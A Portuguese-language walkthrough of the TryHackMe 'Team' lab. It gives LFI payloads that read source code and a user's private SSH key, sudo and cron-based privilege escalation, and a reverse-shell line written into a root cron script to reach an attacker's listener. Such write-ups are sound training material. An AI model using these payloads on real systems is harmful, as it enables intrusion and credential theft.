Team

TryHackMe · Easy by Brenno M.

Team combina descoberta de virtual host, uma inclusão local de arquivo (LFI) para ler uma chave SSH e uma escalação encadeada abusando de permissões sudo sobre scripts.

Reconhecimento

O Nmap revela FTP, SSH e HTTP. Adiciona-se team.thm ao /etc/hosts e descobre-se o vHost dev.team.thm, cujo script.php é vulnerável a LFI.

nmap -sC -sV <IP>
echo '<IP> team.thm dev.team.thm' | sudo tee -a /etc/hosts
ffuf -u http://<IP> -H 'Host: FUZZ.team.thm' -w wordlist -fs <tam>

Foothold - LFI

O LFI, com wrapper base64, lê o código-fonte e, em seguida, a chave privada de dale, usada para autenticar por SSH.

http://dev.team.thm/script.php?page=php://filter/convert.base64-encode/resource=teamshare.php
http://dev.team.thm/script.php?page=../../../../home/dale/.ssh/id_rsa
chmod 600 id_rsa && ssh -i id_rsa dale@<IP>

Escalação de privilégios

O sudo -l permite a dale executar um script como gyles; a partir de gyles, um script chamado por cron do root é gravável, permitindo injetar uma reverse shell privilegiada.

sudo -u gyles /home/gyles/admin_checks
# como gyles, script em /usr/local/bin executado pelo root:
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<MEU_IP>/3333 0>&1' > /usr/local/bin/main_backup.sh
nc -nlvp 3333
cat /root/root.txt
